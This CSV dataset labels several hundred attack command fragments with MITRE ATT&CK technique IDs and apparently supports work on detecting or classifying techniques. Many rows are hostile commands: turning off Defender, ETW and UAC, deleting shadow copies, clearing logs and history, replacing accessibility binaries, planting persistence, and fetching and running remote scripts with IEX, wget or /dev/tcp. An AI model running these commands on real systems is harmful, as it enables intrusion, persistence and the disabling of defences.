command,mitre_id
copy C:\Windows\System32\cmd.exe C:\lsm.exe,T1036
Service1,T1543
sysctl -w kernel.randomize_va_space=0,T1562
SEKURLSA::Pth,T1550
"az ad user list --filter ""displayname eq 'atomicredteam'""",T1136
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
sudo ee /usr/local/etc/sudoers,T1548
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId,T1098
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"""" | sudo tee -a /etc/rc.common",T1037
echo '$text_to_append' >> /etc/profile,T1546
CLSID_ShellLink,T1559
Invoke-Command,T1059
Manufacturer,T1497
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows,T1060
Get-DataInfo.ps1,T1518
Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,T1127
"& ""PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html""",T1027
LDAP://,T1216
mkdir $file_or_folder >nul 2>&1,T1222
bcd.bat,T1059
Add-MpPreference -ExclusionPath $excludedpath,T1562
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",T1218
certutil.exe -p $password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 $output,T1552
DllName,T1547
dscl -create,T1136
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
NtQueryInformationProcess,T1106
Get-WebServicesVirtualDirectory,T1083
sleep -s 60,T1090
HKLM\Software\NFC\,T1012
cmd.exe /C quser,T1033
} while ($false) # dummy loop so that 'break' can be used,T1558
Invoke-Expression,T1059
/dev/shm,T1027
0x7A,T1140
wget http://103.224.80[.]44:8080/kernel,T1071
libprocesshider,T1049
C:\Program Files (x86)\Microsoft Office\root\Office16\,T1137
"echo """" | ""$plink_file"" ""$vm_host"" -ssh -l ""$vm_user"" -pw ""$vm_pass"" -m ""$cli_script""",T1082
cat /etc/pam.d/system-auth,T1201
if ([string]::IsNullOrWhiteSpace($fileContent)) {,T1560
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices,T1012
xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-,T1027
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""",T1547
nltest.exe,T1482
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe""",T1055
wmic shadowcopy delete,T1490
Office365DCOMCheck.ps1,T1036
then sed -i '$ a #art_test_1562_006_2' /etc/$syslog_config_file_name,T1562
mountvol.exe,T1222
if [ -f /etc/issue ]; then cat /etc/issue >> $output_file; fi,T1082
Microsoft.RecoveryServices/Vaults/backupFabrics/protectionContainers/delete,T1490
extrac32 $path\procexp.cab $path\file.txt:procexp.exe,T1564
docker exec t1046_container /scan.sh,T1046
cat /etc/passwd |grep ^art,T1059
crontab -l > /tmp/notevil,T1053
echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt,T1486
"Get-NetFirewallRule | select DisplayName, Enabled, Description",T1518
/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist file,T1046
sudo $program_path -4 -P -p 17 -t 3,T1040
show ip sockets,T1049
"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force",T1548
regasm.exe /U {PATH:.dll},T1218
Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden,T1564
REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0,T1562
"openssl req -x509 -new -nodes -key $key_filename -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out $cert_filename",T1553
try { $myT1036_003 = (Start-Process -PassThru -FilePath $outputfile).Id },T1036
"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""",T1216
%Startup%\mssync.exe,T1547
"if(-not $wdApp.path.contains(""Program Files (x86)""))",T1137
"echo ""Hello World!""",T1056
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe,T1546
echo $HISTFILESIZE,T1562
Get-ChildItem $AppData -Recurse -Force | ForEach-Object {,T1560
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore,T1562
"$sheet.Cells.Item(22,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`"")""",T1204
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f",T1547
/etc/paths.d,T1574
GetKeyboardState,T1056
"echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"""" | sudo tee -a /etc/rc.local",T1037
"wevtutil sl ""$log_name"" /e:false",T1562
rmdir /s /q $folder_to_delete,T1070
InventoryManager.bk,T1070
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting"" -Name ""DisableEnhancedNotifications"" -Value 1",T1562
C:\Windows\System32\utilman.exe,T1546
sysctl hw.model,T1497
dxcap.exe -usage,T1127
rm -rf ~/Library/Mail/copy/*,T1070
C:\Windows\System32\winevt\Logs,T1070
Out-EncryptedScript.ps1,T1027
"icacls ""$path"" /grant Everyone:F /T /C /Q",T1222
/var/log/wtmp,T1070
cmd.exe /c ping %userdomain%,T1016
/maps,T1003
CreatePipe,T1559
ExecStart,T1543
nohup /bin/support &,T1564
"powershell.exe /c ""Get-Service | where-object {$_.DisplayName -like '*sysm*'}""",T1518
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f",T1112
GetExtendedTcpTable,T1049
"Invoke-WebRequest -OutFile $env:Temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk""",T1204
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username,T1136
NTDLL.dll,T1129
3jB(2bsG#@c7,T1027
/usr/sbin/setenforce,T1083
xxd,T1027
"Compress-Archive -Path ""$input_file"" -DestinationPath $output_file -Force",T1074
svchost.exe -k netsvcs,T1055
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultPassword -Value password1 -Force",T1562
public int Attributes;,T1562
mmc.exe gpedit.msc,T1218
./stratus warmup aws.defense-evasion.cloudtrail-event-selectors,T1562
sudo echo '' > $system_log_path,T1070
tdbdump,T1003
Invoke-AllChecks,T1059
"Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48) # Keep original name in description",T1098
powershell.exe -ep bypass -file c:\path\to\a\script.ps1,T1059
$fileExtensions -contains $_.Extension.ToLower(),T1005
.avos,T1486
Nwsapagent,T1543
InfDefaultInstall.exe {PATH:.inf},T1218
cat $output_file 2>/dev/null,T1082
RBCD-Check -consoleoutput -noninteractive,T1082
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose,T1033
"cmd /c ""$ps_exec_location"" -accepteula -i -s cmd.exe /c logman update trace ""$session"" --p ""$provider"" -ets",T1562
"echo 'malicious_command = ""$executor $payload_file_name $script_args""' >> $python_script_name",T1059
$User.DisplayName = $SamAccountName,T1136
"echo ""starting warmup""",T1552
"Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" | findstr Windows",T1012
"Start-Hollow -Sponsor ""$sponsor_binary_path"" -Hollow ""$hollow_binary_path"" -ParentPID $ppid -Verbose",T1055
cd $hashcat_exe\..,T1110
"reg add ""HKLM\software\microsoft\windows defender\spynet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
ExecStopPost,T1543
"if (""$auth"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",T1110
"""C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe"" /reregserver",T1564
GetExtendedUdpTable,T1049
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',T1105
mkdir %APPDATA%\Microsoft\Outlook\ >nul 2>&1,T1137
PIS-DB,T1070
"if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}",T1497
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=organizationalUnit) $optional_args",T1482
dns-sd -B _ssh._tcp .,T1046
if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi,T1082
no logging,T1562
chmod +x /etc/init.d/T1543.002,T1543
pastebin[.]com,T1567
CGEventTap,T1056
sqldumper.exe 540 0 0x01100:40,T1003
__tutma,T1071
ln -sf /dev/null $history_path,T1070
sudo dd if=/dev/zero bs=1000 count=5 of=$system_log_path #log file filled with null bytes(zeros),T1070
"echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002",T1543
.text,T1055
runas,T1134
~/Library/Keychains/,T1555
IARPUinstallerStringLauncher,T1559
"quser /SERVER:""$computer_name""",T1033
HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32,T1546
systemctl restart auditd,T1056
Get-Process,T1057
nltest.exe /domain_trusts,T1482
cp $payload /tmp/hello.c,T1548
osascript -e,T1059
sudo cp $path_malicious_script /Library/StartupItems/atomic.sh,T1037
IShellLink,T1559
"Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable",T1112
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""$target_key_value_name"" -Value ""$payload""",T1547
chmod -R $symbolic_mode $file_or_folder,T1222
HeapAlloc,T1106
REG ADD HKCU\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f,T1562
C:\Windows\System32\DisplaySwitch.exe,T1546
"echo ""Hi friends"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f",T1112
"Write-Host ""End of Hijacking""",T1098
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules",T1562
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap,T1112
hha.dll,T1036
"Invoke-WebRequest -Uri ""https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe"" -OutFile $env:Temp\KeyScrambler_Setup.exe",T1574
"find / -path ""*/Firefox/Profiles/*/places.sqlite"" -exec echo {} >> $output_file \;",T1217
rd /s /q %systemdrive%\$RECYCLE.BIN,T1070
if (Test-Path $credFile) {,T1098
ATBroker.exe /start malware,T1218
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures,T1490
"Write-Host "" [-] Attempting ${password} on account ${user}.""",T1110
"New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER"" -PropertyType String -Value ""$clsid_guid"" -Force | Out-Null",T1574
Invoke-SessionGopher,T1552
"Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value ""T1086 PowerShell Session Creation and Use""",T1059
@reboot,T1053
LVM_SORTITEMS,T1055
C:\Users\Public\Documentsfiles,T1070
code tunnel,T1219
"if (-not (Test-Path ""$file_to_delete"")) { New-Item ""$file_to_delete"" -Force }",T1485
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12,T1003
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set notesFolderPath to (path to home folder as text) & ""Library:Group Containers:group.com.apple.notes:""' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file ""NoteStore.sqlite"", file ""NoteStore.sqlite-shm"", file ""NoteStore.sqlite-wal""} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'",T1005
winlogon.exe,T1531
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f",T1112
import -window root $output_file,T1113
truncate -s 0 /var/log/messages #size parameter shorthand,T1070
New-Item -Path $registryPath -Force,T1546
CreateProcessWithLoginW,T1546
code.exe,T1105
"if [ -f ""/etc/syslog-ng/$syslog_ng_config_file_name"" ];",T1562
"Import-Module ""$ps_module""",T1048
"copy $input_binary ""%SystemRoot%\System32\evilscreensaver.scr""",T1546
"Write-Host ""OneDriveStandaloneUpdater.exe not found at $onedrive_path. Test cannot continue.""",T1105
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Logon"" ""$function_to_execute"" -Force",T1547
if (-Not $domain.IsVerified) {,T1484
popen,T1574
"Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-localserver $clsid'",T1546
echo ' ' >> $rc_service_path/$rc_service_file,T1543
Write-Host $new,T1484
az ad user delete --id $userprincipalname,T1531
SecKeychainFindInternetPassword,T1555
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK,T1547
scp.exe $username@$remote_host:$remote_path $local_path,T1105
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""$new_startup_folder""",T1547
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""ODSUUpdateXMLUrlFromOC"" -Value ""$remote_url"" -Type String -Force",T1105
ssh_zcp,T1555
netsh.exe advfirewall show allprofiles,T1518
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiVirus"" -Value 1",T1562
New-Item $rclone_config_path\rclone\rclone.conf,T1567
jsc.exe /t:library {PATH:.js},T1127
App_Web_,T1036
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,T1003
c:\ProgramData\found_shares.txt,T1074
findstr /si pass *.xml *.doc *.txt *.xls,T1552
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),T1136
az ad user get-member-groups,T1069
pr,T1046
"sudo rm $journal_folder/* #physically deletes the journal files, and not just their content",T1070
export $proxy_scheme_proxy=$proxy_server:$proxy_port,T1090
"schtasks /Create /TN ""$task_name"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F",T1053
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f,T1548
GetAccountPasswordPolicy,T1201
netstat -nao,T1049
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""StubPath"" ""$payload"" -Force",T1547
/proc/<PID>/cmdline,T1036
Get-ProcessTokenPrivilege,T1057
/etc/passwd,T1556
SharpCloud -consoleoutput -noninteractive,T1552
"$sheet.Cells.Item(8,1) = ""=FWRITELN(A5, `""Set winHttp = CreateObject(`""`""WinHTTP.WinHTTPrequest.5.1`""`"")`"")""",T1204
net group,T1098
HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes,T1112
net localgroup Administrators,T1069
FailureCommand,T1574
"Write-Output ""File created: $filePath""",T1105
launchctl load,T1569
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1,T1112
show tcp brief,T1049
/altvba,T1137
oldchecks -noninteractive -consoleoutput,T1082
"echo $ENCODED > $encoded_file && python3 -c ""import base64;dec=base64.b64decode(open('$encoded_file').read());print(dec.decode())""",T1140
"Copy-Item -Path ""C:\windows\system32\calc.exe"" -Destination ""$dest_path\explorer.exe"" -Force",T1218
EverNoteTrayUService,T1547
conhost.exe --headless calc.exe,T1564
foreach ($ip in $subnetIPs) {,T1046
New-Item -Path $dest_path -ItemType Directory,T1218
"if [ -f ""/etc/$auditd_config_file_name"" ];",T1562
ipconfig /all >> %temp%\download,T1016
Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword,T1098
cron,T1053
GetFileAttributesW,T1083
nltest,T1016
"rundll32.exe ""$input_file"",#2",T1218
monitor capture,T1040
SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers,T1112
"New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value '$command_to_execute'",T1548
credwiz.exe,T1574
HKLM\SOFTWARE\Microsoft\CurrentVersion\Run,T1547
eventvwr.exe,T1548
"cscript ""$vbscript"" > $env:TEMP\T1059.005.out.txt",T1059
HKEY_LOCAL_MACHINE\SOFTWARE\DDE\tpid,T1112
if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue },T1562
mshta.exe,T1218
cat /dev/null > $history_path,T1070
cd /tmp/atomic-test-T1036.006,T1036
echo Tickets after requesting SYSVOL:,T1558
DeviceInfo.,T1680
ls -la /Applications,T1082
Sqlps.exe -noprofile,T1218
sc.exe sdset scmanager D:(A;;KA;;;WD),T1569
/tmp/,T1564
RegWrite,T1559
grep vmw /proc/modules,T1082
"ls /etc | egrep -e""fedora\*|debian\*|gentoo\*|mandriva\*|mandrake\*|meego\*|redhat\*|lsb-\*|sun-\*|SUSE\*|release""",T1082
icacls /reset,T1222
qawsed1q2w3e,T1140
net user username \password \domain,T1136
"launchctl load -w ""%s/Library/LaunchAgents/%s""",T1569
"echo ""[*] Listing runlevel directories (/etc/rc*.d):""",T1007
"cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null",T1036
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 3",T1559
sudo nmap -sS $network_range -p $port,T1046
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,T1202
.msi,T1546
